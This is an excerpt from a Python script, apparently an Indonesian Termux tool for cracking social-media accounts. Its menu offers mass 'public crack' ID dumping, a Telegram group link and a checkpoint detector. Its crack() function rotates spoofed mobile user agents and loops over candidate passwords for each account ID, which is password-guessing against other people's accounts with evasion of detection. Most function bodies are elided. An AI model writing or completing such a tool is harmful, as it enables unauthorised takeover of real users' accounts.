...
def menu(my_name,my_id):
	...
	print('')
	cetak(nel('[cyan]1. Crack Publik[cyan]\n2. Gabung Gerup telegram[cyan]\n0. Keluar [white]'))
	_____alvino__adijaya_____ = input('\n>> Pilih : ')
	if _____alvino__adijaya_____ in ['1']:
		dump_massal()
	elif _____alvino__adijaya_____ in ['2']:
		os.system("xdg-open https://t.me/Geruptermux");login()
...
def passwrd():
	...
	print('')
	print('>> Mau cek cekdetector ketik y ( Y/t ) ? ')
	woi = input('>> Pilih : ')
	if woi in ['y','Y']:
		cek_opsi()
	else:
...
def crack(idf,pwv):
	...
	sys.stdout.flush()
	ua = random.choice(['Mozilla/5.0 (Linux; Android 4.1.2; MITO A355 Build/JZO54K) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.166 Mobile Safari/535.19',
                        ...
                        'Mozilla/5.0 (Linux; Android 4.1.2; MITO T300 Build/JZO54K) AppleWebKit/537.36 (KHTML, Like Gecko) Chrome/30.0.1599.92 Mobile Safari/537.36',
                        'Mozilla/5.0 (iPhone; CPU iPhone OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B179 Safari/537.4 Maxthon/4.1.4.2000',
                        'Mozilla/5.0 (Linux; U; Android 4.2.1; it-it; GT-I9100 Build/JOP40G; CyanogenMod-10.1) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30'])
	ua2 = random.choice(['Mozilla/5.0 (Linux; Android 9; SM-J415F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; SM-A515F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 11; M2007J20CG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 9; Redmi Note 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Mobile Safari/537.36'])
	ses = requests.Session()
	for pw in pwv:
		try:
